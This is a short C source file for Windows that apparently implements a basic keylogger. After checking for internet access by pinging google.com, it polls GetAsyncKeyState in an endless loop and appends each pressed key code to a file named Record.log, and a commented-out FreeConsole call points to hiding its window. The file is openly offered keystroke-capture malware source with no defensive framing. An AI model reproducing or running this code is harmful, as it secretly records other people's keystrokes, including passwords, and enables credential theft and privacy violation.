#include <windows.h>
#include <stdio.h>    
#include <process.h>

#define FILE_NAME "Record.log"
#define LIFE_TIME 5

void logKey();

int age = 0;

int main() {

	//FreeConsole();

	if (!system("ping www.google.com -n 1")) {
		printf("Has Connection");
		//scanf_s("%d", &number);
		int age = 1;
		while (1) {

			if (age <= LIFE_TIME) {
				logKey();
			}
			else {
				Sleep(5000);
			}
		}

	}
	printf("No connection");
	//scanf_s("%d", &number);
		
}

void logKey() {
	FILE *file;
	unsigned short ch = 0, i = 0, j = 1; // :)

	while (j < 500) { 
		ch = 1;
		while (ch < 250) {
			for (i = 0; i < 50; i++, ch++) {
				if (GetAsyncKeyState(ch) == -32767) { 
					file = fopen(FILE_NAME, "a");
					fprintf(file, "%d ", ch);
					fclose(file);
				}
			}
			Sleep(1); ///take rest
		}
		j++;
	}
}

